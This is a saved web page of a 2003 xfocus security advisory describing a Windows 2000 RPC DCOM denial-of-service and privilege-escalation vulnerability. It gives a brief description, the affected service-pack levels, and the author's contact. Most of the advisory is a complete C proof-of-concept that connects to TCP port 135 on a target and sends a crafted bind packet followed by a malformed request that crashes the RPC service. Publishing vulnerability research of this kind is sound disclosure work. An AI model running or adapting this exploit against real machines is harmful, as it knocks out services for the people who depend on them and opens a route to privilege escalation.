<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<!-- saved from url=(0046)http://www.xfocus.org/advisories/200307/4.html -->
<HTML><HEAD><TITLE>Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-2">
<META 
content="xfocus, honeynet, honeypot, forensic, intrusion detection, wireless security, security forums, security tools, exploits, security advisories, security vulnerabilities, security tutorials, security training, security help, security standards, security code, security resources, security programming, security how to, cryptography, " 
name=Keywords><LINK 
href="Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability_files/plone.css" 
type=text/css rel=stylesheet>
<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
<BODY text=#000000 bgColor=#ffffff>
<DIV class=top>
<DIV class=searchBox>
<FORM name=searchform action=http://www.google.com/search method=get><INPUT 
type=hidden value=www.xfocus.org name=domains> <INPUT type=hidden 
value=www.xfocus.org name=sitesearch> <INPUT name=q> <INPUT type=submit value="Google Search" name=btnG> </FORM></DIV><IMG height=80 
alt="xfocus logo" 
src="Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability_files/logo.gif" 
width=180 border=0> <IMG height=20 alt="xfocus title" 
src="Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability_files/title.gif" 
width=230 border=0> </DIV>
<DIV class=tabs><A class=plain 
href="http://www.xfocus.org/index.html">welcome</A> <A class=plain 
href="http://www.xfocus.org/documents/index.html">documents</A> <A class=plain 
href="http://www.xfocus.org/programs/index.html">programs</A> <A class=plain 
href="http://www.xfocus.org/exploits/index.html">exploits</A> <A class=selected 
href="http://www.xfocus.org/advisories/index.html">advisories</A> <A class=plain 
href="https://www.xfocus.net/bbs/index.php?lang=en">forums</A> </DIV>
<DIV class=personalBar><A href="http://www.xfocus.net/">Chinese Version</A> 
</DIV>
<TABLE class=columns>
  <TBODY>
  <TR>
    <TD class=left>
      <DIV class=box>
      <H5>Recommend</H5>
      <DIV class=body>
      <DIV class="content odd"><IMG 
      src="Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability_files/document_icon.gif" 
      border=0> <A 
      href="http://www.xfocus.org/advisories/200307/4.html">Microsoft Windows 
      2000 RPC DCOM Interface DOS AND Privilege Escalation 
      Vulnerability</A><BR><IMG 
      src="Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability_files/document_icon.gif" 
      border=0> <A 
      href="http://www.xfocus.org/advisories/200201/3.html">Oracle8.1.6 DBSNMP 
      Remote execute Vulnerability</A><BR><IMG 
      src="Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation Vulnerability_files/document_icon.gif" 
      border=0> <A href="http://www.xfocus.org/advisories/200201/2.html">Siemens 
      Mobie SMS Exceptional Character Vulnerability</A><BR></DIV></DIV></DIV></TD>
    <TD class=main>
      <H1>Microsoft Windows 2000 RPC DCOM Interface DOS AND Privilege Escalation 
      Vulnerability</H1><BR>Create: 2003-07-25<BR>Author: flashsky 
      (flashsky1_at_sina.com)<BR><BR>1.Description:<BR>&nbsp;&nbsp;There is a 
      vulnerability in the part of RPC that deals with message exchange over 
      TCP/IP. The failure results because of incorrect handling of malformed 
      messages. <BR>By sending a malformed messages to DCOM 
      __RemoteGetClassObject interface,The RPC Service will be crashed,and all 
      service and application&nbsp;&nbsp;depending on RPC service will be 
      abnormal.<BR>&nbsp;&nbsp; If attacker have an account ,he can hijack 
      epmapper pipe and 135 port Privilege Escalation after RPC service is 
      crash. <BR><BR>2.Affected Systems:Windows 2000 
      +SP3<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
      Windows 2000 +SP4+<BR><BR>3.Proof of concept codes:<BR><BR><BR>#include 
      &lt;winsock2.h&gt;<BR>#include &lt;stdio.h&gt;<BR>#include 
      &lt;windows.h&gt;<BR>#include &lt;process.h&gt;<BR>#include 
      &lt;string.h&gt;<BR>#include &lt;winbase.h&gt;<BR><BR>unsigned char 
      bindstr[]={<BR>0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,<BR>0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,<BR>0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,<BR>0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,<BR>0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};<BR><BR>unsigned 
      char 
      request[]={<BR>0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00,<BR>0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00,<BR>0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,<BR>0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,<BR>0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};<BR><BR><BR><BR>void 
      main(int argc,char ** argv)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;WSADATA 
      WSAData;<BR>int i;<BR>&nbsp;&nbsp;&nbsp;&nbsp;SOCKET 
      sock;<BR>&nbsp;&nbsp;&nbsp;&nbsp;SOCKADDR_IN addr_in;<BR><BR>short 
      port=135;<BR>unsigned char buf1[0x1000];<BR>printf("RPC DCOM DOS 
      Vulnerability discoveried by Xfocus.org\n");<BR>printf("Code by 
      FlashSky,Flashsky@xfocus.org,benjurry,benjurry@xfocus.org\n");<BR>printf("Welcome 
      to <A href="http://www.xfocus.net/" 
      target=_blank>http://www.xfocus.net/</A>\n");<BR>if(argc&lt;2)<BR>{<BR>&nbsp;&nbsp;printf("useage:%s 
      target\n",argv[0]);<BR>exit(1);<BR>}<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if 
      (WSAStartup(MAKEWORD(2,0),&amp;WSAData)!=0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("WSAStartup 
      error.Error:%d\n",WSAGetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;addr_in.sin_family=AF_INET;<BR>&nbsp;&nbsp;&nbsp;&nbsp;addr_in.sin_port=htons(port);<BR>&nbsp;&nbsp;&nbsp;&nbsp;addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);<BR><BR>if 
      ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Socket 
      failed.Error:%d\n",WSAGetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>if(WSAConnect(sock,(struct 
      sockaddr 
      *)&amp;addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)<BR>{<BR>&nbsp;&nbsp;printf("Connect 
      failed.Error:%d",WSAGetLastError());<BR>&nbsp;&nbsp;return;<BR>}<BR>if 
      (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)<BR>{<BR>&nbsp;&nbsp; 
      printf("Send failed.Error:%d\n",WSAGetLastError());<BR>&nbsp;&nbsp; 
      return;<BR>}<BR><BR>i=recv(sock,buf1,1024,MSG_PEEK);<BR>if 
      (send(sock,request,sizeof(request),0)==SOCKET_ERROR)<BR>{<BR>&nbsp;&nbsp; 
      printf("Send failed.Error:%d\n",WSAGetLastError());<BR>&nbsp;&nbsp; 
      return;<BR>}<BR>i=recv(sock,buf1,1024,MSG_PEEK);<BR>}<BR>5.About 
      XFOCUS.ORG<BR>&nbsp;&nbsp; Xfocus is a non-profit and free technology 
      organization which was founded in 1998 in China. We are devoting to 
      research and demonstration of weaknesses related to network services and 
      communication security.<BR>We hope that we can use new technical tools to 
      achieve our goal, and to broaden our outlook. We also hope we can 
      communicate and help with each other through this amazing 
      Internet.<BR>&nbsp;&nbsp; This site is created for publishing some 
      documents , codes and utilities of our research work. Any suggestions are 
      welcome , please contact us at webmaster_at_xfocus.org .<BR>&nbsp;&nbsp; 
      From the Internet. For the Internet. Have fun! </TD></TR></TBODY></TABLE>
<DIV class=footer>Copyright &copy; 1998-2003 XFOCUS Team. All Rights Reserved 
</DIV></BODY></HTML>
